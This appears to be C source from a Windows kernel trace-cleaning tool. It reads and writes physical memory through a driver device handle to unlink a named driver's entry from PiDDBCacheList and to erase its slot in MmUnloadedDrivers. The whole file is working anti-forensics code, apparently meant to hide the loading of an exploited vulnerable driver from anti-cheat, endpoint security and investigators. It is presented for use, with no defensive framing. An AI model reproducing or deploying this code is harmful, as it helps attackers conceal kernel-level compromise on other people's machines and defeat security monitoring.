#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "symbols.h"
#include "physmem.h"
#include "window.h"
#include "cleanup.h"

static ULONG64 ReadKernelPtr(HANDLE device, SyscallTable* sc, ULONG64 cr3, ULONG64 va) {
    // The window is up by the time these run, and it is the only path that can
    // explain a 0 (see WindowReadKernelPtr), so route through it.
    if (PhysWindowModeEnabled()) return WindowReadKernelPtr(cr3, va, "kernel ptr");
    ULONG64 pa = VirtToPhys(device, sc, cr3, va);
    if (!pa) return 0;
    return PhysRead64(device, sc, pa);
}

static bool WriteKernelPtr(HANDLE device, SyscallTable* sc, ULONG64 cr3, ULONG64 va, ULONG64 value) {
    ULONG64 pa = VirtToPhys(device, sc, cr3, va);
    if (!pa) return false;
    return PhysWrite64(device, sc, pa, value);
}

bool CleanPiDDBCache(
    HANDLE device, SyscallTable* sc,
    ULONG64 systemCr3, KernelOffsets* offsets,
    const wchar_t* driverFileName
) {
    printf("[*] Cleaning PiDDB...\n");

    if (!offsets->PiDDBCacheList)
        printf("[-] PiDDBCacheList RVA is 0, the walk cannot work\n");

    ULONG64 listHeadVA = offsets->NtoskrnlBase + offsets->PiDDBCacheList;
    ULONG64 currentVA = ReadKernelPtr(device, sc, systemCr3, listHeadVA);

    if (!currentVA || currentVA == listHeadVA) {
        printf("[*] PiDDB empty (list head 0x%llX, flink 0x%llX)\n", listHeadVA, currentVA);
        return true;
    }

    int checked = 0;
    while (currentVA != listHeadVA && currentVA != 0 && checked < 256) {
        checked++;

        ULONG64 nameStructVA = currentVA + 0x10;
        ULONG64 nameLenPA = VirtToPhys(device, sc, systemCr3, nameStructVA);
        if (!nameLenPA) goto next;

        {
            USHORT nameLen = (USHORT)PhysRead32(device, sc, nameLenPA);
            if (nameLen == 0 || nameLen > 512) goto next;

            ULONG64 nameBufVA = ReadKernelPtr(device, sc, systemCr3, nameStructVA + 0x08);
            if (!nameBufVA) goto next;

            wchar_t name[128] = {};
            ULONG readLen = nameLen < sizeof(name) - 2 ? nameLen : sizeof(name) - 2;
            ULONG64 nameBufPA = VirtToPhys(device, sc, systemCr3, nameBufVA);
            if (!nameBufPA) goto next;
            PhysReadBuffer(device, sc, nameBufPA, name, readLen);

            if (_wcsicmp(name, driverFileName) == 0) {
                ULONG64 flink = ReadKernelPtr(device, sc, systemCr3, currentVA);
                ULONG64 blink = ReadKernelPtr(device, sc, systemCr3, currentVA + 0x08);

                if (flink && blink) {
                    WriteKernelPtr(device, sc, systemCr3, blink, flink);
                    WriteKernelPtr(device, sc, systemCr3, flink + 0x08, blink);
                    WriteKernelPtr(device, sc, systemCr3, currentVA, currentVA);
                    WriteKernelPtr(device, sc, systemCr3, currentVA + 0x08, currentVA);
                }

                WriteKernelPtr(device, sc, systemCr3, currentVA + 0x20, 0);
                WriteKernelPtr(device, sc, systemCr3, currentVA + 0x10, 0);

                printf("[+] PiDDB entry cleaned\n");
                return true;
            }
        }

    next:
        currentVA = ReadKernelPtr(device, sc, systemCr3, currentVA);
    }

    printf("[*] PiDDB entry not found (%d entries walked)\n", checked);
    return true;
}

// Read a driver path out of an UNLOADED_DRIVERS_ENTRY. The entry's whole
// purpose is to name the driver, so this is what the slot is validated on.
static bool ReadDriverName(HANDLE device, SyscallTable* sc, ULONG64 systemCr3,
                           ULONG64 nameVA, wchar_t* out, ULONG maxChars) {
    out[0] = 0;
    if (!nameVA) return false;

    // Refuse before reading: a bad pointer must not turn into a wild read.
    if (!VirtToPhys(device, sc, systemCr3, nameVA & ~0xFFFULL)) return false;

    const ULONG kRead = 0x200;
    BYTE raw[kRead];
    if (!PhysReadBuffer(device, sc, nameVA, raw, kRead)) return false;

    bool terminated = false;
    for (ULONG i = 0; i + 1 < kRead; i += 2) {
        if (i / 2 >= maxChars) break;
        wchar_t c = (wchar_t)(raw[i] | (raw[i + 1] << 8));
        if (c == 0) { terminated = true; break; }
        // A driver path is plain ASCII; anything else means this is not one.
        if (c < 0x20 || c > 0x7E) return false;
        out[i / 2] = c;
    }
    out[maxChars - 1] = 0;
    return terminated || out[0] != 0;
}

// True when name ends with the given file name, so a full path still matches.
static bool NameMatchesFile(const wchar_t* name, const wchar_t* fileName) {
    if (!name || !name[0] || !fileName || !fileName[0]) return false;
    size_t nl = wcslen(name), fl = wcslen(fileName);
    if (fl > nl) return false;
    return _wcsicmp(name + (nl - fl), fileName) == 0;
}

struct MmSlot {
    ULONG64 nameVA;
    ULONG64 entryPoint;
    ULONG sizeOfImage;
    wchar_t name[80];
    ULONG slot;
    bool readable;
    bool isOurs;
    bool empty;
};

// A candidate name pointer found by probing a slot word by word.
struct MmProbe {
    ULONG slot;
    ULONG offset;
    ULONG64 pointer;
    wchar_t name[80];
    bool readable;
    bool isOurs;
};

// Print a slot's raw bytes. Guessing the layout from a published struct has
// failed twice; the bytes themselves settle it in one run.
static void DumpMmSlot(HANDLE device, SyscallTable* sc, ULONG64 systemCr3,
                       ULONG64 entryPA, ULONG index) {
    BYTE raw[0x28] = {};
    if (!PhysReadBuffer(device, sc, entryPA, raw, sizeof(raw))) {
        printf("[*] Slot %u: could not read 0x28 bytes\n", index);
        return;
    }
    printf("[*] Slot %u raw:\n", index);
    for (ULONG o = 0; o + 8 <= sizeof(raw); o += 8) {
        ULONG64 q = 0;
        memcpy(&q, raw + o, 8);
        printf("[*]  +0x%02X %016llX%s\n", o, (unsigned long long)q,
               (q & 0xFFF) == 0 && q >= 0xFFFFF80000000000ULL ? "  <- page-aligned kernel VA" : "");
    }
}

bool PrepareMmCleanup(
    HANDLE device, SyscallTable* sc,
    ULONG64 systemCr3, KernelOffsets* offsets,
    const wchar_t* driverFileName,
    MmCleanupContext* ctx
) {
    memset(ctx, 0, sizeof(*ctx));

    ULONG64 mmUnloadedVA = offsets->NtoskrnlBase + offsets->MmUnloadedDrivers;
    ULONG64 driversArrayVA = ReadKernelPtr(device, sc, systemCr3, mmUnloadedVA);
    if (!driversArrayVA) return false;

    ULONG64 lastIndexVA = offsets->NtoskrnlBase + offsets->MmLastUnloadedDriver;
    ULONG64 lastIndexPA = VirtToPhys(device, sc, systemCr3, lastIndexVA);
    if (!lastIndexPA) return false;

    ctx->preUnloadIndex = PhysRead32(device, sc, lastIndexPA);

    // Scan the whole ring instead of trusting MmLastUnloadedDriver. Two reasons:
    // the write/advance order is a kernel detail we have already mis-guessed
    // once, and - more usefully - a scan proves whether the address even *is* a
    // 50-entry ring. Picking a slot by index on a wrong base produces a
    // plausible-looking entry that is not one, which is how a wrong RVA becomes
    // a write into unrelated kernel memory.
    const ULONG kSlots = 50;
    const ULONG kStride = 0x28;

    ULONG rawIndex = PhysRead32(device, sc, lastIndexPA);
    ctx->preUnloadIndex = rawIndex;
    if (rawIndex >= kSlots) {
        printf("[-] MmLastUnloadedDriver is %u, not a 0..%u ring index - the RVA is probably wrong\n",
               rawIndex, kSlots - 1);
        return false;
    }

    printf("[*] MmUnloadedDrivers: 0x%llX, ring index %u, scanning %u slots for %ls\n",
           driversArrayVA, rawIndex, kSlots, driverFileName ? driverFileName : L"?");

    MmSlot found = {};
    int oursCount = 0, namedCount = 0, emptyCount = 0, unreadableCount = 0;

    for (ULONG i = 0; i < kSlots; i++) {
        MmSlot s = {};

        ULONG64 entryVA = driversArrayVA + (ULONG64)i * kStride;
        ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
        if (!entryPA) {
            printf("[-] Slot %u did not translate (entry VA 0x%llX)\n", i, entryVA);
            return false;
        }

        s.nameVA = PhysRead64(device, sc, entryPA + 0x10);
        s.entryPoint = PhysRead64(device, sc, entryPA + 0x18);
        s.sizeOfImage = PhysRead32(device, sc, entryPA + 0x20);
        s.empty = (s.nameVA == 0 && s.entryPoint == 0 && s.sizeOfImage == 0);

        if (s.empty) { emptyCount++; continue; }

        s.slot = i;
        s.readable = ReadDriverName(device, sc, systemCr3, s.nameVA, s.name, 64);
        s.isOurs = s.readable && NameMatchesFile(s.name, driverFileName);

        if (s.readable && s.name[0]) namedCount++;
        else unreadableCount++;

        if (s.isOurs) {
            oursCount++;
            found = s;
        }
    }

    printf("[*] %d empty, %d naming a driver, %d not a driver path, %d matching ours\n",
           emptyCount, namedCount, unreadableCount, oursCount);

    if (oursCount == 0) {
        // The ring is real - the populated slot count tracks the ring index - so
        // what is wrong is which word inside a slot holds the name. Rather than
        // guessing offsets from a published struct definition, test each 8-byte
        // word and keep the one that points at a readable path naming our driver.
        MmProbe hits[64];
        int hitCount = 0;
        MmProbe* firstHit = NULL;

        ULONG firstSlot = rawIndex > 4 ? rawIndex - 4 : 0;
        for (ULONG i = firstSlot; i < rawIndex && hitCount < (int)(sizeof(hits)/sizeof(hits[0])); i++) {
            ULONG64 entryVA = driversArrayVA + (ULONG64)i * kStride;
            ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
            if (!entryPA) continue;

            for (ULONG off = 0; off + 8 <= kStride && hitCount < (int)(sizeof(hits)/sizeof(hits[0])); off += 8) {
                MmProbe& h = hits[hitCount];
                h.slot = i;
                h.offset = off;
                h.pointer = PhysRead64(device, sc, entryPA + off);
                h.name[0] = 0;
                h.readable = ReadDriverName(device, sc, systemCr3, h.pointer, h.name, 64);
                h.isOurs = h.readable && h.name[0] && NameMatchesFile(h.name, driverFileName);
                if (h.readable && h.name[0]) {
                    if (!firstHit) firstHit = &h;
                    hitCount++;
                }
            }
        }

        int oursHits = 0, firstOurHit = -1;
        for (int i = 0; i < hitCount; i++) {
            if (hits[i].isOurs) { oursHits++; if (firstOurHit < 0) firstOurHit = i; }
        }

        if (hitCount) {
            printf("[*] %d readable path(s) in slots %u..%u\n",
                   hitCount, firstSlot, rawIndex ? rawIndex - 1 : 0);
            for (int i = 0; i < hitCount; i++) {
                printf("[*] Slot %u +0x%02X word %016llX -> '%ls'%s\n",
                       hits[i].slot, hits[i].offset,
                       (unsigned long long)hits[i].pointer, hits[i].name,
                       hits[i].isOurs ? "   <-- OURS" : "");
            }
        } else {
            printf("[*] No word in those slots points at a readable path\n");
        }

        // The layout is the open question, so show the bytes.
        for (ULONG back = 1; back <= 2 && back <= rawIndex; back++) {
            ULONG idx = rawIndex - back;
            ULONG64 entryVA = driversArrayVA + (ULONG64)idx * kStride;
            ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);
            if (entryPA) DumpMmSlot(device, sc, systemCr3, entryPA, idx);
        }

        if (oursHits == 1) {
            // Adopt the probe hit as the entry to erase.
            MmProbe& h = hits[firstOurHit];
            found.slot = h.slot;
            for (ULONG c = 0; c + 1 < sizeof(found.name) / sizeof(found.name[0]) && h.name[c]; c++)
                found.name[c] = h.name[c];
            found.name[sizeof(found.name) / sizeof(found.name[0]) - 1] = 0;
        } else if (oursHits > 1) {
            printf("[-] %d words name our driver across the probed slots\n", oursHits);
            return false;
        } else {
            printf("[-] Nothing in the ring names %ls.\n\n", driverFileName ? driverFileName : L"?");
            return false;
        }
    } else if (oursCount > 1) {
        printf("[-] %u slots name our driver\n", oursCount);
        return false;
    }

    ULONG64 entryVA = driversArrayVA + (ULONG64)found.slot * kStride;
    ULONG64 entryPA = VirtToPhys(device, sc, systemCr3, entryVA);

    ctx->offsetInPage = (ULONG)(entryPA & 0xFFF);
    ctx->driversArrayPA = entryPA;
    // Rewind the ring index only when the erased slot is the one the index just
    // advanced past, so it points back at the slot that is now free.
    ctx->rewindIndex = (found.slot != rawIndex);
    printf("[*] Erasing slot %u ('%ls'), ring index %u -> %s\n",
           found.slot, found.name, rawIndex,
           ctx->rewindIndex ? "rewinding" : "unchanged");

    // pre-map pages - mappings survive driver unload
    ctx->mappedDriversPage = PhysMap(device, sc, entryPA & ~0xFFFULL, 0x1000);
    if (!ctx->mappedDriversPage) return false;

    ctx->indexOffsetInPage = (ULONG)(lastIndexPA & 0xFFF);
    ctx->indexPA = lastIndexPA;

    ctx->mappedIndexPage = PhysMap(device, sc, lastIndexPA & ~0xFFFULL, 0x1000);
    if (!ctx->mappedIndexPage) return false;

    printf("[+] MmUnloadedDrivers pages pre-mapped\n");
    return true;
}

bool FinishMmCleanup(MmCleanupContext* ctx) {
    if (!ctx->mappedDriversPage || !ctx->mappedIndexPage) return false;

    BYTE* entryPtr = (BYTE*)ctx->mappedDriversPage + ctx->offsetInPage;
    memset(entryPtr, 0, 0x28);

    if (ctx->rewindIndex) {
        // Only rewind when the erased slot was the previous one, so the ring
        // points back at the slot that is now free.
        ULONG* indexPtr = (ULONG*)((BYTE*)ctx->mappedIndexPage + ctx->indexOffsetInPage);
        ULONG cur = *indexPtr;
        *indexPtr = cur > 0 ? cur - 1 : 49;
    }

    printf("[+] MmUnloadedDrivers cleaned\n");
    return true;
}
